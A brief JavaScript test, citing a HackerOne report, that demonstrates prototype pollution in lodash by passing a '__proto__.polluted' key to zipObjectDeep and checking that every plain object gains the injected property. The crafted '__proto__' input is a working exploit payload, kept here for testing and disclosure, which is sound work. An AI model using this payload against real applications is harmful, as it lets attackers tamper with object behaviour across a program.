// https://hackerone.com/reports/712065
test("prototype pollution in lodash", () => {
  expect({}.polluted).toBe(undefined);

  const _ = require("lodash");
  _.zipObjectDeep(["__proto__.polluted"], ["yes"]);

  expect({}.polluted).toBe("yes");
});
